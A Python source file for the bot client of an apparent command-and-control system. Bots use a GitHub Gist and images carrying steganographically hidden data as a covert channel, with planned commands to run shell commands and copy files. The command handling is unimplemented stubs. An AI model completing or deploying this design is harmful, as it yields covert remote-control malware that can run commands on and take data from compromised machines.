import argparse
import os
import select
import sys
from typing import Optional, Any, Dict, Union
import random

from terminal import gray, rst, cyan, magenta, yellow, green, red
from common import \
    CONTROL_IMAGE, \
    UPDATE_INTERVAL, \
    now_ms, \
    decode_data, \
    encode_data, \
    format_timestamp, \
    ParticipantBase

import subprocess


class Bot(ParticipantBase):

    def _setup(self) -> None:
        super()._setup()

        self._name = None
        self._image = None
        self._state: Dict[str, Union[None, int, dict]] = {
            'last_update': None,
            'result': None,
            #   id: ''
            #   exitCode:
            #   stdout:
            #   stderr:
        }

        pass

    def run(self) -> None:
        self._setup()

        while True:
            self._update_state()
            print(
                f'\nAuto update in {cyan}{UPDATE_INTERVAL}{rst} seconds. Press {yellow}enter{rst} to force update.\n'
                f'Press {red}Ctrl-C{rst} to unregister and terminate.\n',
                end='',
            )
            ready_read, _, _ = select.select([sys.stdin], [], [], UPDATE_INTERVAL)
            if len(ready_read) == 1:
                sys.stdin.readline()
            else:
                # add en empty line
                print('')

        pass

    def destroy(self) -> None:
        print('\nDestroying the bot...')
        if self._comm_client is None:
            return
        self._comm_client.pull_changes()
        if os.path.exists('comm/' + self._name):
            print(f'{gray}unregistering - removing image file from the gist ...{rst}')
            os.remove('comm/' + self._name)
            self._comm_client.add([self._name])
            self._comm_client.commit_and_push_if_needed()
        print(f'{green}Successfully terminated.{rst}')
        pass

    def _get_command(self, control_data: None):
        if self._name is None:
            return None
        if not isinstance(control_data, dict):
            return None
        if self._name not in control_data:
            return None
        return control_data[self._name]

    @staticmethod
    def _is_valid_command(cmd: Dict[str, Any]) -> bool:
        # id: random string
        # name: terminate|run|copy
        # shell: bool
        # cmd: str
        # file_name: str
        return False

    def _generate_name(self) -> None:
        # TODO: prioritize unused images from the library
        images = list(self._lib_images - {CONTROL_IMAGE})
        self._image = random.choice(images)
        self._name = str(random.randint(0, 9999)) + '-' + self._image
        print(f'generated name {cyan}{self._name}{rst}')
        pass

    def _register(self) -> None:
        # TODO: detect name collision and handle it gracefully
        self._generate_name()
        pass

    def _ensure_registration(self) -> None:
        if self._name is None or not os.path.exists('comm/' + self._name):
            self._register()
        pass

    def _update_state(self) -> None:
        print(f'{gray}updating state ...{rst}')

        self._comm_client.pull_changes()

        self._ensure_registration()

        if os.path.exists('comm/' + CONTROL_IMAGE):
            control_data = decode_data('comm/' + CONTROL_IMAGE)
            cmd = self._get_command(control_data)
            if cmd is not None and self._is_valid_command(cmd):
                print('processing command')

        # TODO: commands processing

        self._state['last_update'] = now_ms()
        encode_data(
            image_file='lib/' + self._image,
            data=self._state,
            output_file='comm/' + self._name,
        )
        self._comm_client.add([self._name])

        self._comm_client.commit_and_push_if_needed()

        print(f"{gray}successful update on {green}{format_timestamp(self._state['last_update'])}{rst}")

        pass

    # COMMANDS

    def _handle_terminate_command(self) -> None:
        pass

    def _handle_run_command(self, shell: bool, cmd: str) -> None:

        pass

    def _handle_copy_from_command(self, file_name: str) -> None:
        pass


if __name__ == '__main__':
    _parser = argparse.ArgumentParser()
    _parser.add_argument(
        'workdir',
        help='work directory where the files and directories created by the controller will be put',
    )
    _parser.add_argument(
        'gist',
        help='ID of the GitHub Gist for communication with bots',
    )
    _parser.add_argument(
        'token',
        help='GitHub Personal access token (classic) with (at least) gist scope',
    )
    _parser.add_argument(
        '--author',
        help='Override default git commit author',
    )
    _parser.add_argument(
        '--recreate',
        action='store_true',
        help='Remove and recreate the workdir even if it already exists',
    )
    _parser.add_argument(
        '--skip-init-reset',
        action='store_true',
        help='Skip resetting the git repos if they already exist.',
    )
    _parser.add_argument(
        '--skip-init-pull',
        action='store_true',
        help='Skip updating the git repos if they already exist.',
    )
    _parser.add_argument(
        '--fast-init',
        action='store_true',
        help='Shortcut for combination of of --skip-init-reset and --skip-init-pull.',
    )
    _args = _parser.parse_args()
    _bot = Bot(
        workdir=_args.workdir,
        gist=_args.gist,
        token=_args.token,
        author=_args.author,
        recreate_workdir=_args.recreate,
        skip_init_reset=_args.fast_init or _args.skip_init_reset,
        skip_init_pull=_args.fast_init or _args.skip_init_pull,
    )
    try:
        _bot.run()
    except KeyboardInterrupt:
        _bot.destroy()
